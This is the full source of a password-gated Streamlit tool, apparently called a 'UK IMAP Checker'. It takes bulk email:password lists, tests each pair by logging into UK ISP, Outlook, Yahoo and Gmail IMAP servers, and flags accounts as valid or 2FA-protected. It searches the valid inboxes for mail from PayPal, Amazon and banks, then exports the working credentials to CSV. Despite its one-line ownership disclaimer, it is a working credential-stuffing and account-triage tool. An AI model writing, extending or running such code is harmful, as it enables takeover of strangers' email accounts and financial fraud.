























# ==================================================
# 🔒 PASSWORD PROTECTION — KEEP AT TOP
# ==================================================
import streamlit as st

# --- PASSWORD SET — DO NOT EDIT BELOW ---
APP_PASSWORD = "SpookzChecker9090"
# ----------------------------------------

if "authenticated" not in st.session_state:
    st.session_state.authenticated = False

if not st.session_state.authenticated:
    st.title("🔐 Enter Password")
    st.info("Enter your password to access the tool.")
    input_pwd = st.text_input("Password", type="password")
    if st.button("🔑 Login"):
        if input_pwd == APP_PASSWORD:
            st.session_state.authenticated = True
            st.rerun()
        else:
            st.error("❌ Incorrect password — try again.")
    st.stop()

# ==================================================
# 🇬🇧 MAIN APP — Loads ONLY after login
# ==================================================

import imaplib
import ssl
import time
import csv
from io import StringIO
from concurrent.futures import ThreadPoolExecutor, as_completed

# ⚙️ SETTINGS
IMAP_PORT = 993
DELAY_BETWEEN = 0.3
MAX_WORKERS = 3

# 🇬🇧 ALL COMMON UK IMAP PROVIDERS
IMAP_SERVERS = {
    # Virgin Media Group
    "virginmedia.com": "imap.virginmedia.com",
    "ntlworld.com": "imap.virginmedia.com",
    "blueyonder.co.uk": "imap.virginmedia.com",
    "virgin.net": "imap.virginmedia.com",
    # BT Group
    "btinternet.com": "mail.btinternet.com",
    "btopenworld.com": "mail.btinternet.com",
    "talk21.com": "mail.btinternet.com",
    # TalkTalk Group
    "talktalk.net": "mail.talktalk.net",
    "tiscali.co.uk": "mail.talktalk.net",
    "ukgateway.net": "mail.talktalk.net",
    "tinyonline.co.uk": "mail.talktalk.net",
    "pipex.net": "mail.talktalk.net",
    "postoffice.co.uk": "mail.talktalk.net",
    # Sky
    "sky.com": "imap.tools.sky.com",
    "sky.co.uk": "imap.tools.sky.com",
    # Plusnet
    "plus.net": "imap.plus.net",
    "plus.com": "imap.plus.net",
    # Microsoft / Outlook
    "outlook.com": "outlook.office365.com",
    "hotmail.com": "outlook.office365.com",
    "hotmail.co.uk": "outlook.office365.com",
    "live.co.uk": "outlook.office365.com",
    "msn.com": "outlook.office365.com",
    # Yahoo UK
    "yahoo.co.uk": "imap.mail.yahoo.co.uk",
    "ymail.com": "imap.mail.yahoo.co.uk",
    # Gmail
    "gmail.com": "imap.gmail.com",
    "googlemail.com": "imap.gmail.com",
}

def get_imap_server(email):
    domain = email.lower().split("@")[-1].strip()
    return IMAP_SERVERS.get(domain, None)

def search_domain_in_inbox(mail, target_domains):
    domain_hits = 0
    for domain in target_domains:
        domain = domain.strip().lower()
        if not domain:
            continue
        criteria = f'FROM "{domain}"'
        status, msg_ids = mail.search(None, criteria)
        if status == "OK":
            ids = msg_ids[0].split()
            domain_hits += len(ids)
    return domain_hits

def check_single_account(email_addr, password, search_domains):
    time.sleep(DELAY_BETWEEN)
    server = get_imap_server(email_addr)
    if not server:
        return ("UNKNOWN_DOMAIN", 0)
    try:
        context = ssl.create_default_context()
        imap = imaplib.IMAP4_SSL(server, IMAP_PORT, ssl_context=context)
        imap.login(email_addr, password)
        status, _ = imap.select("INBOX")
        if status != "OK":
            imap.logout()
            return ("VALID_NO_INBOX", 0)
        hit_count = 0
        if search_domains:
            hit_count = search_domain_in_inbox(imap, search_domains)
        imap.logout()
        return ("INBOX_HIT", hit_count)
    except imaplib.IMAP4.error as e:
        err = str(e).lower()
        if "authentication failed" in err or "invalid credentials" in err or "login failed" in err:
            return ("INVALID", 0)
        elif "2fa" in err or "two factor" in err or "app password" in err or "verification" in err:
            return ("2FA_ENABLED", 0)
        return ("INVALID", 0)
    except Exception:
        return ("INVALID", 0)

# --- PAGE SETUP ---
st.set_page_config(page_title="🇬🇧 UK IMAP Checker", layout="wide")
st.title("📧 UK IMAP Checker — Auto-Detect + Inbox Search")
st.markdown("**⚠️ ONLY for accounts you own or have written permission.**")
st.info("Auto-detects: Virgin Media (ntlworld/blueyonder) • BT • TalkTalk • Sky • Plusnet • Outlook • Yahoo UK • Gmail")

# --- INPUT AREA ---
col1, col2 = st.columns([3, 1])
with col1:
    input_text = st.text_area(
        "Enter Accounts (email:password — one per line)",
        height=180,
        placeholder="you@ntlworld.com:password123\nyou@blueyonder.co.uk:pass456"
    )
    domain_search = st.text_area(
        "🔍 Search Inbox FOR THESE DOMAINS (one per line — leave blank to skip)",
        height=120,
        placeholder="paypal.com\namazon.co.uk\nbank.co.uk"
    )
with col2:
    max_workers = st.slider("Concurrent Checks", 1, 5, MAX_WORKERS)
    start_btn = st.button("🚀 START CHECK", type="primary", use_container_width=True)

target_domains = [d.strip() for d in domain_search.strip().split("\n") if d.strip()]

# --- RUN CHECKS ---
if start_btn and input_text:
    lines = [l.strip() for l in input_text.strip().split("\n") if l.strip()]
    accounts = []
    unknown_domains = []
    for line in lines:
        if ":" in line:
            parts = line.split(":", 1)
            email_addr = parts[0].strip()
            domain = email_addr.lower().split("@")[-1].strip()
            if domain not in IMAP_SERVERS:
                unknown_domains.append(email_addr)
            accounts.append((email_addr, parts[1].strip()))
    total = len(accounts)
    
    if unknown_domains:
        st.warning(f"⚠️ {len(unknown_domains)} emails use unknown domains")
    if target_domains:
        st.info(f"Loaded **{total}** accounts — searching for **{len(target_domains)} domains**...")
    else:
        st.info(f"Loaded **{total}** accounts — no domain search specified...")

    checked = valid = inbox_hit = two_fa = invalid = unknown = total_domain_hits = 0
    results_data = []
    start_time = time.time()

    progress_bar = st.progress(0)
    c1, c2, c3, c4, c5, c6, c7 = st.columns(7)
    ch_p = c1.empty(); v_p = c2.empty(); ih_p = c3.empty()
    tf_p = c4.empty(); inv_p = c5.empty(); unk_p = c6.empty(); dom_p = c7.empty()

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_acc = {executor.submit(check_single_account, e, p, target_domains): (e, p) for e, p in accounts}
        for future in as_completed(future_to_acc):
            email_addr, password = future_to_acc[future]
            checked += 1
            result, hits = future.result()
            if result == "INBOX_HIT":
                valid += 1; inbox_hit += 1; total_domain_hits += hits
            elif result == "VALID_NO_INBOX":
                valid += 1
            elif result == "2FA_ENABLED":
                two_fa += 1
            elif result == "UNKNOWN_DOMAIN":
                unknown += 1
            else:
                invalid += 1
            results_data.append([email_addr, get_imap_server(email_addr) or "N/A", password, result, hits])
            progress_bar.progress(checked / total)
            elapsed = time.time() - start_time
            cpm = round((checked / elapsed) * 60) if elapsed > 0 else 0
            ch_p.metric("Checked", checked); v_p.metric("Valid", valid); ih_p.metric("Inbox OK", inbox_hit)
            tf_p.metric("2FA", two_fa); inv_p.metric("Invalid", invalid); unk_p.metric("Unknown", unknown)
            dom_p.metric("Domain Hits", total_domain_hits)

    st.success("✅ CHECK COMPLETE!")
    st.subheader("📊 Final Results")
    col1, col2, col3, col4, col5, col6, col7 = st.columns(7)
    col1.metric("Total", checked); col2.metric("Valid", valid); col3.metric("Inbox OK", inbox_hit)
    col4.metric("2FA", two_fa); col5.metric("Invalid", invalid); col6.metric("Unknown", unknown)
    col7.metric("Domain Hits", total_domain_hits)
    st.info(f"⏱️ Time: {round(time.time() - start_time, 1)}s | Speed: {round((checked / (time.time() - start_time)) * 60)} CPM")

    st.subheader("📥 Export Results")
    csv_buffer = StringIO()
    writer = csv.writer(csv_buffer)
    writer.writerow(["Email", "IMAP_Server", "Password", "Status", "Domain_Hits"])
    writer.writerows(results_data)
    st.download_button(
        label="📂 Download CSV",
        data=csv_buffer.getvalue(),
        file_name=f"uk_imap_checker_{time.strftime('%Y%m%d_%H%M%S')}.csv",
        mime="text/csv",
        type="primary"
    )

elif start_btn and not input_text:
    st.warning("⚠️ Paste at least one account first!")
